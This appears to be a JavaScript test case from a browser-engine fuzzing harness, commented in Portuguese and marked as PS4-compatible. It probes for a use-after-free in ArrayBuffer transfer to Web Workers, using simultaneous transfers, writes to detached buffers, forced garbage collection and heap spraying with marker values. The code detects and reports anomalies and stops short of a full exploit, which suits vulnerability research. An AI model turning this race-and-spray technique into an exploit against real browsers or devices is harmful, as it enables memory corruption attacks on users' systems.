/**
 * TEST: Worker Transfer UAF - AVANÇADO
 * Race condition agressiva na transferência de ArrayBuffer
 * Usa MÚLTIPLOS workers simultâneos + GC forçado + re-alocação imediata
 */

export const testWorkerTransferUafAdvanced = {
    id: 'WORKER_TRANSFER_UAF_ADV',
    name: '💀 Worker Transfer UAF Advanced',
    risk: 'CRITICAL',
    category: 'WORKER',
    description: 'Race condition multi-worker com GC forçado e re-alocação',
    ps4Compatible: true,

    setup: function() {
        this.BUFFER_SIZE = 256;
        this.WORKER_COUNT = 10;
        this.SPY_COUNT = 200;
        this.uafDetected = false;
        this.raceResults = [];

        // Spy buffers
        this.spyBuffers = [];
        for (let i = 0; i < this.SPY_COUNT; i++) {
            const buf = new ArrayBuffer(64);
            const view = new Uint32Array(buf);
            view.fill(0xBBBB0000 + i);
            this.spyBuffers.push({ buffer: buf, view: view, index: i });
        }
    },

    probe: [
        function(scenario) { return scenario.uafDetected ? 1 : 0; },
        function(scenario) { return scenario.raceResults?.length ?? 0; },
        function(scenario) { 
            return scenario.spyBuffers?.filter(s => s.view[0] !== (0xBBBB0000 + s.index))?.length ?? 0;
        }
    ],

    trigger: function() {
        this.uafDetected = false;
        this.raceResults = [];

        if (typeof Worker === 'undefined') {
            this.raceResults.push({ error: 'No Worker support' });
            return;
        }

        // ==========================================
        // ESTRATÉGIA: Timing attack na transferência
        // ==========================================
        
        const workerCode = `
            self.onmessage = function(e) {
                const buffer = e.data;
                
                // Tenta acessar IMEDIATAMENTE após receber
                try {
                    const view = new Uint32Array(buffer);
                    const firstVal = view[0];
                    
                    // Modifica o buffer e envia de volta
                    view[0] = 0x13371337;
                    view[1] = 0xCAFEBABE;
                    
                    // Tenta enviar de volta (pode não funcionar se detached)
                    self.postMessage({
                        status: 'modified',
                        firstOriginal: firstVal,
                        byteLength: buffer.byteLength
                    }, [buffer]); // Tenta transferir de volta!
                    
                } catch(err) {
                    self.postMessage({
                        status: 'error',
                        error: err.message
                    });
                }
            };
        `;

        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
        const workerUrl = URL.createObjectURL(workerBlob);

        // Cria MÚLTIPLOS workers e buffers para condições de corrida
        const workers = [];
        const buffers = [];
        const views = [];

        for (let i = 0; i < this.WORKER_COUNT; i++) {
            try {
                const worker = new Worker(workerUrl);
                const buffer = new ArrayBuffer(this.BUFFER_SIZE);
                const view = new Uint32Array(buffer);
                
                // Preenche com padrão único
                for (let j = 0; j < view.length; j++) {
                    view[j] = 0xDEAD0000 + (i * 1000) + j;
                }

                workers.push(worker);
                buffers.push(buffer);
                views.push(view);

                // Configura listener ANTES de enviar
                worker.onmessage = (e) => {
                    this.raceResults.push({
                        worker: i,
                        response: e.data,
                        timestamp: performance.now()
                    });

                    // Se worker conseguiu modificar e re-transferir
                    if (e.data?.status === 'modified') {
                        // Verifica se o buffer ORIGINAL foi afetado
                        try {
                            const originalVal = views[i]?.[0];
                            if (originalVal !== undefined && originalVal !== (0xDEAD0000 + i * 1000)) {
                                this.uafDetected = true;
                                this.raceResults.push({
                                    type: 'UAF_DETECTED',
                                    worker: i,
                                    originalExpected: '0x' + (0xDEAD0000 + i * 1000).toString(16),
                                    originalActual: '0x' + originalVal?.toString(16),
                                    message: 'Buffer original foi modificado após transferência!'
                                });
                            }
                        } catch (err) {
                            // Buffer detached - esperado
                        }
                    }
                };

            } catch (e) {
                this.raceResults.push({ error: `Worker ${i} creation failed: ${e.message}` });
                break;
            }
        }

        // ==========================================
        // FASE DE ATAQUE: Envio simultâneo
        // ==========================================
        
        // Envia TODOS os buffers ao mesmo tempo (condição de corrida)
        for (let i = 0; i < workers.length; i++) {
            try {
                workers[i].postMessage(buffers[i], [buffers[i]]);
            } catch (e) {
                this.raceResults.push({
                    worker: i,
                    transferError: e.message
                });
            }
        }

        // ==========================================
        // DURANTE A TRANSFERÊNCIA: Acessa os buffers
        // ==========================================
        
        // Imediatamente após enviar, tenta acessar
        for (let i = 0; i < views.length; i++) {
            try {
                const val = views[i]?.[0];
                if (val !== undefined) {
                    this.raceResults.push({
                        type: 'POST_TRANSFER_ACCESS',
                        worker: i,
                        value: '0x' + val.toString(16),
                        message: 'Acesso ao buffer APÓS transferência funcionou!'
                    });
                    this.uafDetected = true;
                }
            } catch (e) {
                // Detached - esperado
            }

            try {
                views[i][0] = 0x41414141;
                if (views[i][0] === 0x41414141) {
                    this.raceResults.push({
                        type: 'POST_TRANSFER_WRITE',
                        worker: i,
                        message: 'ESCRITA em buffer transferido funcionou!'
                    });
                    this.uafDetected = true;
                }
            } catch (e) {
                // Detached - esperado
            }
        }

        // ==========================================
        // FASE 2: GC + Re-alocação no mesmo espaço
        // ==========================================
        if (typeof gc === 'function') {
            gc();
            gc();
        }

        // Aloca novos buffers (podem ocupar espaço dos transferidos)
        const newBuffers = [];
        for (let i = 0; i < 100; i++) {
            const buf = new ArrayBuffer(this.BUFFER_SIZE);
            const view = new Uint32Array(buf);
            view.fill(0xCAFE0000 + i);
            newBuffers.push({ buffer: buf, view: view });
        }

        // Verifica se views antigos agora apontam para dados novos
        for (let i = 0; i < views.length; i++) {
            try {
                const val = views[i]?.[0];
                if (val !== undefined) {
                    // Verifica se é um dos novos padrões
                    if ((val & 0xFFFF0000) === 0xCAFE0000) {
                        this.uafDetected = true;
                        this.raceResults.push({
                            type: 'USE_AFTER_FREE',
                            worker: i,
                            leakedNewBuffer: val & 0xFFFF,
                            value: '0x' + val.toString(16),
                            message: 'View antigo agora aponta para novo buffer alocado! UAF confirmado!'
                        });
                    }
                    // Verifica se é spy data
                    if ((val & 0xFFFF0000) === 0xBBBB0000) {
                        this.uafDetected = true;
                        this.raceResults.push({
                            type: 'SPY_DATA_LEAK',
                            worker: i,
                            leakedSpyIndex: val & 0xFFFF,
                            value: '0x' + val.toString(16),
                            message: 'View antigo vazou dados de spy buffer!'
                        });
                    }
                }
            } catch (e) {
                // Detached
            }
        }

        // ==========================================
        // FASE 3: Termina workers e verifica
        // ==========================================
        for (const worker of workers) {
            try { worker.terminate(); } catch (e) {}
        }
        
        URL.revokeObjectURL(workerUrl);

        if (typeof gc === 'function') gc();
    },

    cleanup: function() {
        this.spyBuffers = null;
        this.raceResults = null;
    },

    customValidator: function(baseResults, afterResults) {
        if (this.uafDetected) {
            const uafEntries = this.raceResults?.filter(r => 
                r.type === 'UAF_DETECTED' || 
                r.type === 'USE_AFTER_FREE' || 
                r.type === 'SPY_DATA_LEAK' ||
                r.type === 'POST_TRANSFER_ACCESS' ||
                r.type === 'POST_TRANSFER_WRITE'
            ) || [];

            return {
                anomaly: true,
                reason: `💥💥💥 UAF CONFIRMADO: ${uafEntries.length} evidências de Use-After-Free!\n\n` +
                       `Detalhes:\n${JSON.stringify(uafEntries, null, 2)}\n\n` +
                       `Total race results: ${this.raceResults?.length}`
            };
        }

        // Spy corrompido
        if (afterResults[2] > 0) {
            return {
                anomaly: true,
                reason: `💥 SPY CORRUPTION: ${afterResults[2]} spy buffers corrompidos durante ataque UAF!`
            };
        }

        return { anomaly: false, reason: '' };
    }
};
